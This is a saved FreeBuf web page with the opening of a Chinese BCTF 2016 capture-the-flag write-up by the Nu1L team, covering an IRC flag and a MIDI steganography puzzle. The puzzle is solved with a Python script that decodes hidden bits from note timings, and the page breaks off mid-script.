<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  BCTF解题报告 - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="*原创作者：Nu1L团队 
题目所有文件下载地址：Bctf.rar
Misc &amp; Steganography &amp; forensic &amp; Crypto
1.&nbsp;irc(10分)
直接登录上官方irc可得到flag
2.	midifan(150分)
题目 Q： Xiaoming is a fan of …" />
<meta name="keywords" content="bctf, CTF, Writeup, 头条, 网络安全案例分享,网络安全知识大全,网络安全技术" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='【信息安全创投巡礼】苹果天使基金：我们为什么专注于信息安全领域投资？' href='http://www.freebuf.com/news/topnews/100257.html' />
<link rel='next' title='苏州通付盾攻防实验室安全招聘' href='http://www.freebuf.com/jobs/100375.html' />
<link rel='canonical' href='http://www.freebuf.com/news/topnews/100143.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=100143' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    BCTF解题报告                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/lyuchen65" title="由 lyuchen65 发布" rel="author">lyuchen65</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2016-03-30</span>
                                                                                                                <span class="rmb"><img title="现金奖励" src="http://image.3001.net/images/new/icon-m.jpg"/></span>
                                                                        <span class="look">共<strong>242658</strong>人围观
                                        ，发现 <strong>6</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./news/topnews">头条</a><a href="http://www.freebuf.com/./articles/network">网络安全</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p><span style="color: rgb(51, 51, 51);"><span style="color: rgb(0, 112, 192); font-size: 16px;">*原创作者：Nu1L团队</span> <br /></span></p>
<p><span style="color: rgb(51, 51, 51);">题目所有文件下载地址：<a target="_blank" href="http://blog.albertchang.cn/BCTF.rar">Bctf.rar</a><br /></span></p>
<h2><b><span style="color: rgb(51, 51, 51);">Misc &amp; Steganography &amp; forensic &amp; Crypto</span><br /></b></h2>
<h3>1.&nbsp;irc(10分)</h3>
<p>直接登录上官方irc可得到flag</p>
<h3>2.	midifan(150分)</h3>
<p><b>题目 Q： Xiaoming is a fan of MIDI songs, and he found this piece of sheet a bit different. Could you help him find out the hidden message?</b></p>
<p>听了一天的魂斗罗，整个人都不好了。开始没想到，以为是摩斯密码的，然后发现思路错了，查了查，midi可以用python直接解析，也可以用lilypond，解析出来都没想到具体的解法，直到在google上发现可以将midi转化为xml，在这个网站上<a href="http://flashmusicgames.com/midi/mid2xml.php" target="_blank">flashmusicgames</a>转化完了下载下来，发现其中有一些数据不合理，比如61、361、481等等，之后想到可能是note。&nbsp;</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591422787267.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="83" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591422787267.png!small" height="83" width="554"></p></noscript>
<p>发现其中都是在channel 1 上，Velocity均为80，就在note上浪费了很久的时间。之后想到可能是跟Absolute的61有关，手动提取0,61,120,180,240,300,361,420，如果为奇数位，偶数为0转化为二进制，在转化为01000010，发现是字母B，但是后面转化为11000010，不是C，然后发现如果是反序变为01000011即为C，又因为B是0100010，反序不变，于是，此题可解。首先去掉xml中的多余数据，然后修正一个，使得python可以解析，之后提取Absolute，脚本如下：</p>
</p>
<pre><code><p>import xml.dom.minidom</p><p>import sys</p><p>import binascii</p><p>list1 = []</p><p>res = ''</p><p>flag = ''</p><p>dom = xml.dom.minidom.parse('midi.xml')</p><p>root = dom.documentElement</p><p>bb = root.getElementsByTagName('Event')</p><p>for i in xrange(len(bb)):</p><p>&nbsp; &nbsp; b = bb[i]</p><p>&nbsp; &nbsp; # print int(b.getElementsByTagName('Absolute')[0].firstChild.data)</p><p>&nbsp; &nbsp; if (((int(b.getElementsByTagName('Absolute')[0].firstChild.data) % 60 == 1) | (int(b.getElementsByTagName('Absolute')[0].firstChild.data) % 60 == 0))):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; # print</p><p>&nbsp; &nbsp; &nbsp; &nbsp; # type(int(b.getElementsByTagName('NoteOn')[0].getAttribute('Channel')))</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if (b.getElementsByTagName('NoteOn')):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # print b.getElementsByTagName('NoteOn')[0].getAttribute('Channel')</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if int(b.getElementsByTagName('NoteOn')[0].getAttribute('Channel')) == 1:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list1.append(</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int(b.getElementsByTagName('Absolute')[0].firstChild.data))</p><p># print list1</p><p>list1.append(0)</p><p>list2 = sorted(list1)</p><p># print list2</p><p># print i%60</p><p>for i in xrange(437):</p><p>&nbsp; &nbsp; if (list2[i] / 60 == list2[i + 1] / 60) &amp; (list2[i] % 60 == 0):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; list2.remove(list2[i])</p><p># print list2</p><p>for i in 